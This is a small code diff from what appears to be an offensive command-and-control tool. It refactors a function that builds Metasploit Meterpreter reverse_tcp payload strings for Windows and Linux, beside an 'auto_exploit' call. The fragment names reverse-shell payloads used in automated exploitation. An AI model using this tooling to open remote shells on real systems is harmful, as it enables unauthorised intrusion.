@@ -348,7 +348,7 @@ C2({ action: "auto_exploit", framework: "metasploit", platform: "linux", lport: 
   }
 
   private genMsfPayload(payload_type: string, platform: string, lhost: string, lport: number, customPayload?: string): string {
-    const arch = platform === 'windows' ? 'x64' : 'x64'
+    const arch = 'x64'
     const defaultPayload = platform === 'windows'
       ? `windows/${arch}/meterpreter/reverse_tcp`
       : `linux/${arch}/meterpreter/reverse_tcp`
